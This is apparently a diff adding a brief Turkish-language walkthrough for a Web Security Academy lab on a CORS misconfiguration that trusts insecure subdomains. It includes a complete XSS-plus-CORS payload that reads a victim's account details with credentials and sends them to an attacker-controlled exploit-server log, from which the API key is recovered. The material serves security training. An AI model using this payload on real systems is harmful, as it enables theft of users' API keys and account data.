@@ -1,0 +1,16 @@
+LAB: CORS vulnerability with trusted insecure protocols
+
+1 - wiener:peter ile giriş yapın. Burp Suite -> Proxy > HTTP History -> /accountDetails -> Repeater
+Aşağıdaki başlığını ekleyin.
+Origin: null
+
+2 - Cevap başlığında Access-Control-Allow-Origin göreceksiniz.
+
+3 - Exploit servere giderek aşağıdaki payloadı kurbana gönderin.
+<script>
+    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+
+4 - Access log kısmında GET /log?key ile başlayan isteği URL DECODE ederek API_KEYi kaydedin.
+
+
